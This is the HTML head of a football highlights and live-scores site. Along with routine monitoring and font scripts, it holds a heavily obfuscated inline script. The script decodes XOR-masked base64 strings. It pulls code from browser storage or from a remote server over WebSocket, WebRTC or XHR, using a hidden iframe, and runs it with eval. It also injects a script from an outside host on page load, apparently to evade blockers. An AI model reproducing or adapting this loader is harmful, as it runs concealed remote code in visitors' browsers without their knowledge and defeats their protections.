<!doctype html>

<html lang="en" ng-app="footyroom" ng-controller="AppCtrl"
    xmlns:og="http://opengraphprotocol.org/schema/"
    xmlns:fb="http://www.facebook.com/2008/fbml"
    ng-class="{'is-search-open': showSearchResult}">

    <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={xpid:"VQUHVlNbDRACVVBTAQcOVw=="};window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){var o=t[e][1][n];return r(o||n)},o,o.exports)}return n[e].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({1:[function(t,n,e){function r(t){try{s.console&&console.log(t)}catch(n){}}var o,i=t("ee"),a=t(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,n,e){r(e.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,n){return t}).join(", ")))},{}],2:[function(t,n,e){function r(t,n,e,r,s){try{p?p-=1:o(s||new UncaughtException(t,n,e),!0)}catch(f){try{i("ierr",[f,c.now(),!0])}catch(d){}}return"function"==typeof u&&u.apply(this,a(arguments))}function UncaughtException(t,n,e){this.message=t||"Uncaught error with no additional information",this.sourceURL=n,this.line=e}function o(t,n){var e=n?null:c.now();i("err",[t,e])}var i=t("handle"),a=t(16),s=t("ee"),c=t("loader"),f=t("gos"),u=window.onerror,d=!1,l="nr@seenError",p=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(h){"stack"in h&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),d=!0)}s.on("fn-start",function(t,n,e){d&&(p+=1)}),s.on("fn-err",function(t,n,e){d&&!e[l]&&(f(e,l,function(){return!0}),this.thrown=!0,o(e))}),s.on("fn-end",function(){d&&!this.thrown&&p>0&&(p-=1)}),s.on("internal-error",function(t){i("ierr",[t,c.now(),!0])})},{}],3:[function(t,n,e){t("loader").features.ins=!0},{}],4:[function(t,n,e){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,w="fn"+h,v="bstTimer",y="pushState",g=t("loader");g.features.stn=!0,t(6);var b=NREUM.o.EV;o.on(m,function(t,n){var e=t[0];e instanceof b&&(this.bstStart=g.now())}),o.on(w,function(t,n){var e=t[0];e instanceof b&&i("bst",[e,n,this.bstStart,g.now()])}),a.on(m,function(t,n,e){this.bstStart=g.now(),this.bstType=e}),a.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),this.bstType])}),s.on(m,function(){this.bstStart=g.now()}),s.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=g.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,{passive:!0}),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,n,e){function r(t){for(var n=t;n&&!n.hasOwnProperty(u);)n=Object.getPrototypeOf(n);n&&o(n)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,n){return t[1]}var a=t("ee").get("events"),s=t(18)(a,!0),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";n.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,n){var e=t[1],r=c(e,"nr@wrapped",function(){function t(){if("function"==typeof e.handleEvent)return e.handleEvent.apply(e,arguments)}var n={object:t,"function":e}[typeof e];return n?s(n,"fn-",null,n.name||"anonymous"):e});this.wrapped=t[1]=r}),a.on(d+"-start",function(t){t[1]=this.wrapped||t[1]})},{}],6:[function(t,n,e){var r=t("ee").get("history"),o=t(18)(r);n.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,n,e){var r=t("ee").get("raf"),o=t(18)(r),i="equestAnimationFrame";n.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,n,e){function r(t,n,e){t[0]=a(t[0],"fn-",null,e)}function o(t,n,e){this.method=e,this.timerDuration=isNaN(t[1])?0:+t[1],t[0]=a(t[0],"fn-",this,e)}var i=t("ee").get("timer"),a=t(18)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";n.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],9:[function(t,n,e){function r(t,n){d.inPlace(n,["onreadystatechange"],"fn-",s)}function o(){var t=this,n=u.context(t);t.readyState>3&&!n.resolved&&(n.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,y,"fn-",s)}function i(t){g.push(t),h&&(x?x.then(a):w?w(a):(E=-E,O.data=E))}function a(){for(var t=0;t<g.length;t++)r([],g[t]);g.length&&(g=[])}function s(t,n){return n}function c(t,n){for(var e in t)n[e]=t[e];return n}t(5);var f=t("ee"),u=f.get("xhr"),d=t(18)(u),l=NREUM.o,p=l.XHR,h=l.MO,m=l.PR,w=l.SI,v="readystatechange",y=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],g=[];n.exports=u;var b=window.XMLHttpRequest=function(t){var n=new p(t);try{u.emit("new-xhr",[n],n),n.addEventListener(v,o,!1)}catch(e){try{u.emit("internal-error",[e])}catch(r){}}return n};if(c(p,b),b.prototype=p.prototype,d.inPlace(b.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,n){r(t,n),i(n)}),u.on("open-xhr-start",r),h){var x=m&&m.resolve();if(!w&&!m){var E=1,O=document.createTextNode(E);new h(a).observe(O,{characterData:!0})}}else f.on("fn-end",function(t){t[0]&&t[0].type===v||a()})},{}],10:[function(t,n,e){function r(t){var n=this.params,e=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!n.aborted){if(e.duration=a.now()-this.startTime,4===t.readyState){n.status=t.status;var i=o(t,this.lastSize);if(i&&(e.rxSize=i),this.sameOrigin){var c=t.getResponseHeader("X-NewRelic-App-Data");c&&(n.cat=c.split(", ").pop())}}else n.status=0;e.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[n,e,this.startTime])}}}function o(t,n){var e=t.responseType;if("json"===e&&null!==n)return n;var r="arraybuffer"===e||"blob"===e||"json"===e?t.response:t.responseText;return h(r)}function i(t,n){var e=c(n),r=t.params;r.host=e.hostname+":"+e.port,r.pathname=e.pathname,t.sameOrigin=e.sameOrigin}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var n=this;n.totalCbs=0,n.called=0,n.cbTime=0,n.end=r,n.ended=!1,n.xhrGuids={},n.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){n.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,n){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&n.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,n){var e=this.metrics,r=t[0],o=this;if(e&&r){var i=h(r);i&&(e.txSize=i)}this.startTime=a.now(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof n.onload))&&o.end(n)}catch(e){try{f.emit("internal-error",[e])}catch(r){}}};for(var s=0;s<d;s++)n.addEventListener(u[s],this.listener,!1)}),f.on("xhr-cb-time",function(t,n,e){this.cbTime+=t,n?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof e.onload||this.end(e)}),f.on("xhr-load-added",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&!this.xhrGuids[e]&&(this.xhrGuids[e]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&this.xhrGuids[e]&&(delete this.xhrGuids[e],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],n)}),f.on("removeEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],n)}),f.on("fn-start",function(t,n,e){n instanceof m&&("onload"===e&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=a.now()))}),f.on("fn-end",function(t,n){this.xhrCbStart&&f.emit("xhr-cb-time",[a.now()-this.xhrCbStart,this.onload,n],n)})}},{}],11:[function(t,n,e){n.exports=function(t){var n=document.createElement("a"),e=window.location,r={};n.href=t,r.port=n.port;var o=n.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=n.hostname||e.hostname,r.pathname=n.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!n.protocol||":"===n.protocol||n.protocol===e.protocol,a=n.hostname===document.domain&&n.port===e.port;return r.sameOrigin=i&&(!n.hostname||a),r}},{}],12:[function(t,n,e){function r(){}function o(t,n,e){return function(){return i(t,[f.now()].concat(s(arguments)),n?null:this,e),n?void 0:this}}var i=t("handle"),a=t(15),s=t(16),c=t("ee").get("tracer"),f=t("loader"),u=NREUM;"undefined"==typeof window.newrelic&&(newrelic=u);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",p=l+"ixn-";a(d,function(t,n){u[n]=o(l+n,!0,"api")}),u.addPageAction=o(l+"addPageAction",!0),u.setCurrentRouteName=o(l+"routeName",!0),n.exports=newrelic,u.interaction=function(){return(new r).get()};var h=r.prototype={createTracer:function(t,n){var e={},r=this,o="function"==typeof n;return i(p+"tracer",[f.now(),t,e],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],e),o)try{return n.apply(this,arguments)}catch(t){throw c.emit("fn-err",[arguments,this,t],e),t}finally{c.emit("fn-end",[f.now()],e)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,n){h[n]=o(p+n)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,f.now()])}},{}],13:[function(t,n,e){n.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(n){return}}}},{}],14:[function(t,n,e){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),n.exports=r},{}],15:[function(t,n,e){function r(t,n){var e=[],r="",i=0;for(r in t)o.call(t,r)&&(e[i]=n(r,t[r]),i+=1);return e}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],16:[function(t,n,e){function r(t,n,e){n||(n=0),"undefined"==typeof e&&(e=t?t.length:0);for(var r=-1,o=e-n||0,i=Array(o<0?0:o);++r<o;)i[r]=t[n+r];return i}n.exports=r},{}],17:[function(t,n,e){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],18:[function(t,n,e){function r(t){return!(t&&t instanceof Function&&t.apply&&!t[a])}var o=t("ee"),i=t(16),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;n.exports=function(t,n){function e(t,n,e,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof e?e(r,a):e||{}}catch(f){l([f,"",[r,a,o],s])}u(n+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(d){throw u(n+"err",[r,a,d],s),d}finally{u(n+"end",[r,a,c],s)}}return r(t)?t:(n||(n=""),nrWrapper[a]=t,d(t,nrWrapper),nrWrapper)}function f(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)s=n[c],a=t[s],r(a)||(t[s]=e(a,f?s+o:o,i,s))}function u(e,r,o){if(!c||n){var i=c;c=!0;try{t.emit(e,r,o,n)}catch(a){l([a,e,r,o])}c=i}}function d(t,n){if(Object.defineProperty&&Object.keys)try{var e=Object.keys(t);return e.forEach(function(e){Object.defineProperty(n,e,{get:function(){return t[e]},set:function(n){return t[e]=n,n}})}),n}catch(r){l([r])}for(var o in t)s.call(t,o)&&(n[o]=t[o]);return n}function l(n){try{t.emit("internal-error",n)}catch(e){}}return t||(t=o),e.inPlace=f,e.flag=a,e}},{}],ee:[function(t,n,e){function r(){}function o(t){function n(t){return t&&t instanceof r?t:t?c(t,s,i):i()}function e(e,r,o,i){if(!l.aborted||i){t&&t(e,r,o);for(var a=n(o),s=h(e),c=s.length,f=0;f<c;f++)s[f].apply(a,r);var d=u[y[e]];return d&&d.push([g,e,r,a]),a}}function p(t,n){v[t]=h(t).concat(n)}function h(t){return v[t]||[]}function m(t){return d[t]=d[t]||o(e)}function w(t,n){f(t,function(t,e){n=n||"feature",y[e]=n,n in u||(u[n]=[])})}var v={},y={},g={on:p,emit:e,get:m,listeners:h,context:n,buffer:w,abort:a,aborted:!1};return g}function i(){return new r}function a(){(u.api||u.feature)&&(l.aborted=!0,u=l.backlog={})}var s="nr@context",c=t("gos"),f=t(15),u={},d={},l=n.exports=o();l.backlog=u},{}],gos:[function(t,n,e){function r(t,n,e){if(o.call(t,n))return t[n];var r=e();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,n,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[n]=r,r}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(t,n,e){function r(t,n,e,r){o.buffer([t],r),o.emit(t,n,e)}var o=t("ee").get("handle");n.exports=r,r.ee=o},{}],id:[function(t,n,e){function r(t){var n=typeof t;return!t||"object"!==n&&"function"!==n?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");n.exports=r},{}],loader:[function(t,n,e){function r(){if(!x++){var t=b.info=NREUM.info,n=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&n))return u.abort();f(y,function(n,e){t[n]||(t[n]=e)}),c("mark",["onload",a()+b.offset],null,"api");var e=l.createElement("script");e.src="https://"+t.agent,n.parentNode.insertBefore(e,n)}}function o(){"complete"===l.readyState&&i()}function i(){c("mark",["domContent",a()+b.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(s=Math.max((new Date).getTime(),s))-b.offset}var s=(new Date).getTime(),c=t("handle"),f=t(15),u=t("ee"),d=window,l=d.document,p="addEventListener",h="attachEvent",m=d.XMLHttpRequest,w=m&&m.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:m,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},g=m&&w&&w[p]&&!/CriOS/.test(navigator.userAgent),b=n.exports={offset:s,now:a,origin:v,features:{},xhrWrappable:g};t(12),l[p]?(l[p]("DOMContentLoaded",i,!1),d[p]("load",r,!1)):(l[h]("onreadystatechange",o),d[h]("onload",r)),c("mark",["firstbyte",s],null,"api");var x=0,E=t(17)},{}]},{},["loader",2,10,4,3]);</script>
        <title>FootyRoom - Football / Soccer Highlights and Live Scores</title>
        <meta name="description" content="Award winning football website. Among the best for latest highlights &amp; football stats. Join our vibrant community &amp; the forums that never sleep.">
        <meta name="keywords" content="football, soccer, highlights, statistics, goals, premier league, la liga">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <link rel="shortcut icon" href="/pics/favicons/favicon.ico">
        <link rel="icon" type="image/png" href="/pics/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="apple-touch-icon" href="/pics/favicons/apple-touch-icon-152x152.png">

        	<link rel="next" href="/?page=2">

        <!-- Facebook meta -->
        <meta property="fb:admins" content="100007389730865" />
        <meta property="og:site_name" content="FootyRoom"/>
        <meta property="og:image" content="http://cdn.footyroom.com/pics/iphone/1024x1024.png" />

                
        <!-- IE9 Support -->
        <script type="text/javascript"> if (!window.console) console = {log: function() {}}; </script>

        <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"></script>
        <script type="text/javascript">
            WebFont.load({
                google: {families: ['Source+Sans+Pro:300,400:latin']}
            });
        </script>

        <script>try{(function(){function z(){try{var a=I()}catch(c){}if(a)try{A(a.h,null)}catch(c){delete window.localStorage[a.key],delete window.sessionStorage[a.key]}else J(function(a,b){b.as=!0;try{A(a,b)}catch(e){}},K)}function K(){var b=window.location.protocol==a("Gh4ZBQBO")?a("Gh4ZBQBOW00="):a("Gh4ZBUlbWw==");(new Image).src=b+a("CgIfWxAcAQkNGxEbFgUEWxMcBg==")+a("XQZSBU4=")+"2149060001"+a("VAlQEBU=")+a("VAkPSA==")+Math.random().toString().slice(3,9)}function J(a,c){function b(){var d=e.shift();if(d)try{d(a,b)}catch(m){b()}else u(),c()}try{L()}catch(f){u();c();return}var e=[M,N,O,P];b()}function A(a,c){(function(){eval(a)})({e:a,p:c,n:g})}function I(){var b=[];window.localStorage&&b.push(window.localStorage);window.sessionStorage&&b.push(window.sessionStorage);var c=B(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),C(a("AhgIFB4WGAc=")));c=new Uint8Array(c);for(var d="",e=0;e<c.length;e++)d+=String.fromCharCode(c[e]);c=btoa(d);d=(new Date).getTime();for(e=0;e<b.length;e++){var f=b[e],m;for(m in f)if(0===m.lastIndexOf(c,0)){try{for(var k=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),g=atob(f[m]),l=new Uint8Array(g.length),h=0;h<g.length;h++)l[h]=g.charCodeAt(h);var n=r(B(k,l.buffer))}catch(Q){continue}h=parseInt(n.substring(0,13),10);if(!isNaN(h))if(864E5<d-h||1>d-h)f.removeItem(m);else if((h=n.substring(13))&&!(16>h.length))return{h:h,key:m}}}return null}function N(b,c){var d=a("E0QOHQYfFQ4NBx8bEFsOGh0="),e=a("QV5aTQ=="),f=a("RShXRkVOQSZWRUlRODRXTTFJKk9DTlteKV5eLyxORF5ILi5PMTZOI1lNQ1NDN1lPMkVRQkhNWVRVX1NUKURNVkVQWUNJN0dYKkJKWDxPL0RKNl5MTEJVJl1XUFtVMTE=");d=d+":"+e;e={};e[a("BxgBBg==")]=a("Bh8fG0k=")+d+a("TR4fFB0HBA0eA00fGgU=");e[a("ERgIERYaAAsNGw==")]=a("CwsZHB4V");e[a("BxkIBx0VGQc=")]=a("CwsZHB4V");D(f,e,function(b){b=b.match(new RegExp(a("LAkMGxcdEAMYEko3HV5NKRRYS15GTRoAHxExKj9dVzIWQU1dLxBfPkIrFEAlWzERWy9FKh1cRkQzCU9OGw0HTgAPARQK")));if(null==b)return null;b=b[1];return a("EQsDERoQFRYJTUFLSFU4MSBTU0VKRl1SXE0=")+b+a("UlxeRUJCVBYVB1AZHBkMDFABChIdBU8=")+b+a("UhgdGgEAVFRfR0FdWRsIAQccGR1UFAAXG01U")},b,c)}function O(b,c){var d=a("E0QOHQYfFQ4NBx8bEFsOGh0="),e=a("RFpdRA=="),f=a("NF9XNDFOTFtWMkRRTURXTEFJXE9DRFxeX19eLFdOQC9IXy9PNkVOJFlNRF1DQihPNjZRQz9NXVBVVSJULTFNWjdQXjZJMTdYW09KW09PWEZKMllMSjFVUC5XU1dVTU8=");d=d+":"+e;e={};e[a("BxgBBg==")]=[a("AR4YG0k=")+d];D(f,e,function(b){b=b.match(new RegExp(a("LAkMGxcdEAMYEko3HV5NKRRYS15GTRoAHxExKj9dVzIWQU1dLxBfPkIrFEAlWzERWy9FKh1cTzgLRk1OGw0HTgEYCxkL")));if(null==b)return null;b=b[1];return a("EQsDERoQFRYJTUBLSFU4MSBTWUdNQFtcXFtQWU8=")+b+a("Uh4UBVMcGxEY")},b,c)}function D(b,c,d,e,f){function m(a){k||(k=!0,a.apply(null,Array.prototype.slice.call(arguments,1)))}var k=!1;e=m.bind(null,e);f=m.bind(null,f);var p={};p[a("GwkIJhYGAgceBA==")]=[c];var l=new g.c(p);l[a("ERgIFAcRMAMYFjMDGBsDEBw=")](a("XQcIARJbBAsCEA==")).binaryType=a("ExgfFAoWAQQKEgI=");l[a("HQQEFhYXFQwIHhQKDRA=")]=function(b){if(null!=b[a("EQsDERoQFRYJ")]&&(b=d(b[a("EQsDERoQFRYJ")][a("EQsDERoQFRYJ")]),null!=b)){var c={};c[a("EQsDERoQFRYJ")]=b;c[a("AQ4dOD8dGgclGRQOAQ==")]=0;l[a("Ew4JPBARNwMCExkPGAEI")](new g.b(c),function(){},function(){})}};l.addEventListener(a("GwkIFhwaGgcPAxkEFwYZFAQWCB4YGQgB"),function(){l[a("GwkINhwaGgcPAxkEFyYZFAQW")]===a("FAsEGRYQ")&&f()});var h=a("BFddfxxJAREJBR4KFBBNRVBDSz83VyY0W01VXFhaR0BCRFx/AEkHBx8EGQQXGwwYFXkISzA5Ty0/WURfXUNZXlxaQ0R5AElSTEd6CkQTBBsXFhkGCx4BEFUeDA9CRkJYUg==")+b+a("eAtQHBARWQ0cAxkEFwZXAQIaCB0VEmUJUgwUHgMdFA8GAwIbU0VGUVhXND81JkImMyc7VkxHX1RlDFkdDAAHAxMaV0BDRERCGxISGQ0WQBERBwoVERYBCgoBRFxaQn0PTwMOEF4BEhANEEo=")+function(){for(var b="",c=a("QlpdRUNERFI="),d=0;16>d;++d){var e=(4294967296*Math.random()>>>0).toString(16);b+=c.substring(0,c.length-e.length)+e}return b}()+a("eAtQHBARWRIbE0pbSUVdRUBDW0ZJR19UX11UXl9ER15CWl1FQ0REUlxHQGE=");l[a("ERgIFAcROwQKEgI=")](function(b){l[a("AQ8ZORwXFQ4oEgMICxwdARkcBQ==")](b,function(){var b={};b[a("BhMdEA==")]=a("EwQeAhYG");b[a("AQ4d")]=h;l[a("AQ8ZJxYZGxYJMxUYGgcEBQQaBBg=")](new g.f(b),function(){},function(){})},function(){})},function(){});b=l[a("ERgIFAcRMAMYFjMDGBsDEBw=")](a("XR0eBXM=")+window.navigator.userAgent);b.binaryType=a("ExgfFAoWAQQKEgI=");E(b,v(),function(b){e(b,{rtc:l})},function(){f()})}function P(b,c){function d(b){m||(m=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var e=v();e=(window.location.protocol==a("Gh4ZBQBO")?a("Gh4ZBQBOW00="):a("Gh4ZBUlbWw=="))+a("CgIfWxAcAQkNGxEbFgUEWxMcBg==")+e;var f=a("NS85"),m=!1;b=d.bind(null,b);c=d.bind(null,c);var k=new g.g;k.onreadystatechange=function(){4==k.readyState&&(0==k.status?c():b(r(k.response),{}))};k.onerror=function(){c()};k.open(f,e,!0);k.responseType=a("ExgfFAoWAQQKEgI=");k.send(null)}function M(b,c){var d=a("BRkeT1xb"),e=a("E0QOHQYfFQ4NBx8bEFsOGh0="),f=new g.a(d+e+a("XR0eBQ=="));f.binaryType=a("ExgfFAoWAQQKEgI=");E(f,v(),function(a){b(a,{ws:f})},function(){c()})}function E(b,c,d,e){function f(b){g||(g=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var g=!1;d=f.bind(null,d);e=f.bind(null,e);var k=!1,p=setTimeout(function(){e(Error())},3E3),l=C(JSON.stringify({url:c||"",method:a("NS85"),headers:null,body:null}));b.onopen=function(){clearTimeout(p);b.send(l)};var h=new ArrayBuffer(0),n;b.onmessage=function(b){if(4===b.data.byteLength){var a=new Uint8Array(b.data);if(222===a[0]&&173===a[1]&&190===a[2]&&239===a[3])return}!1===k?(k=!0,b=r(b.data),n=JSON.parse(b),n={status:n.status||0,headers:{}}):(b=b.data,a=new Uint8Array(h.byteLength+b.byteLength),a.set(new Uint8Array(h),0),a.set(new Uint8Array(b),h.byteLength),h=a.buffer)};b.onerror=function(){clearTimeout(p);e(Error())};b.onclose=function(){k?(n.body=h,d(r(n.body))):(clearTimeout(p),e(Error()))}}function v(){return a("XQ8HBkwESQ==")+"2149060001"}function w(b){return window[b.name]?window[b.name]:b[a("EQUDARYaACYDFAUGHBsZ")]&&b[a("EQUDARYaACYDFAUGHBsZ")][a("Fg8LFAYYADQFEgc=")]?b[a("EQUDARYaACYDFAUGHBsZ")][a("Fg8LFAYYADQFEgc=")]:b[a("EQUDARYaADUFGRQEDg==")]}function F(){var b=document.createElement(a("GwwfFB4R"));b.style.height=a("QxoV");b.style.width=a("QxoV");b.style.display=a("HAUDEA==");b[a("ARgOERwX")]=a("Ew==");b.name||(b.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7));(document.body||document.head||document.documentElement).appendChild(b);var c=w(b);c.document.documentElement||c.document.write(a("Ew=="));try{c.stop()}catch(d){}return b}function L(){G=a("BwQGGxwDGg==");t=a("EQIfGh4R");q=a("FAMfEBUbDA==");x=a("HRoIBxI=");y=a("AQsLFAEd");var b=F();b=w(b);var c=b.navigator.userAgent;var d=(new RegExp(a("EQIfGh4RCAEEBR8GEAAA"),"i")).test(c)?t:(new RegExp(a("FAMfEBUbDB4FFBUcHBQeEBwPDQ4QGBw="),"i")).test(c)?q:(new RegExp(a("LEJFSlIXHBADGhUXGBsJBx8aD19XXkUXDgsFHAY="),"i")).test(c)?y:(new RegExp(a("HRofCRwEHQ0f"),"i")).test(c)?x:window[a("EQIfGh4R")]?t:"undefined"!==typeof InstallTrigger?q:G;-1===[t,q,x,y].indexOf(d)&&(b=window);c=a("FxwMGQ==");g.c=b[c](a("BQMDERwDWjA4NCAOHAcuGh4dDhUNHgAKTxEYThgdGQodHUMCFhYfCxglJCgpEAgHMxwFGBwUGw0AA0QSE1QABxwOAgJdGRsYPiMzOxwQHzYfHQUTGgMGCwFNGBJPAx4AFgUaWx4HJjYvJxUOCzYCGx4WCAIQGAE="));g.f=b[c](a("BQMDERwDWjA4NCMOCgYEGh43DgUaBQYUGwQLAE8IC04FAwMRHANaFQkVGwINJzk2IxYYBRAYASAKHgccBgQDBx0ETQkPVAMLAhMfHFcYAg8iJyglHAQcDQADIAscFwUHAh4EGh1UCB5MABkFHRoaWx0AOSI6JAoXHAQLACsRBA0AAx0BGhsa"));g.b=b[c](a("BQMDERwDWjA4NDkIHDYMGxQaDxcNEk8YE00TBwEQGBlcHQgXGB0AMDg0OQgcNgwbFBoPFw0STxgTTRMHARAYGVwHAg8hIDcrDxIzChcRBBERBw5WBQtPEwYDAAEYWhodID4uPBARNwMCExkPGAEI"));d===q?(d=F(),g.a=w(d)[c](a("BQMDERwDWjUJFSMEGh4IAQ==")),d.parentElement.removeChild(d)):g.a=b[c](a("BQMDERwDWjUJFSMEGh4IAQ=="));g.g=b[c](a("BQMDERwDWjohOzgfDQU/EAEGDgUN"))}function B(b,a){var c=new Uint8Array(a),e=new ArrayBuffer(a.byteLength);e=new Uint8Array(e);for(var f=0;f<a.byteLength;f++)e[f]=c[f]^b.charCodeAt(f%b.length);return e.buffer}function r(b){if(window.TextDecoder)return(new window.TextDecoder("utf-8")).decode(new Uint8Array(b));var a="";b=new Uint8Array(b);for(var d=b.byteLength,e=0;e<d;e++)a+=String.fromCharCode(b[e]);return decodeURIComponent(escape(a))}function C(a){if(window.TextEncoder)return(new window.TextEncoder("utf-8")).encode(a).buffer;a=unescape(encodeURIComponent(a));for(var b=new Uint8Array(a.length),d=0;d<a.length;d++)b[d]=a.charCodeAt(d);return b.buffer}function a(a){a=window.atob(a);for(var b="",d=0;d<a.length;d++)b+=String.fromCharCode(a.charCodeAt(d)^"rjmusttblwpkyumupskvywodomdnotwn".charCodeAt(d%32));return b}function u(){if(!H){var a=document.createElement("script");a.src=("https:"==window.location.protocol?"https://":"http://")+"xhr.chukalapopi.com"+decodeURIComponent("%2Fljs%3Fp%3D")+"2149060001";document.getElementsByTagName("head")[0].appendChild(a);H=!0}}var g={},G,t,q,x,y,H=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.i)try{u()}catch(b){}try{z()}catch(b){}})()}catch(z){};</script>
        
        <!-- Freestar -->
        <script data-cfasync="false" type="text/javascript">
            var freestar = freestar || {};
